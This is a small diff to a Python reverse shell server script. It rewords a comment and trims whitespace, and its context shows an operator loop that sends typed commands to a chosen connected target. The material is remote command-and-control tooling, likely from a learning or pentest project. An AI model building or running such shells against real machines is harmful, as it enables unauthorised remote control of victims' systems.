@@ -15,7 +15,7 @@ class ReverseShellServer(Server):
         #returning the response of the command as the value of this method
         return comm_response
 
-#testing the reverse shell server
+#quick testing of the reverse shell server
 
 if __name__ == "__main__":
     import threading
@@ -31,7 +31,7 @@ if __name__ == "__main__":
         target_num = int(input("Enter target_num>>").strip())
         first_comm = "pwd"
         while True:
-            comm = input(f"{server.send_command(first_comm,target_num)}>>")    
+            comm = input(f"{server.send_command(first_comm,target_num)}>>")
             if comm == "quit":
                 break
             res = server.send_command(comm,target_num)
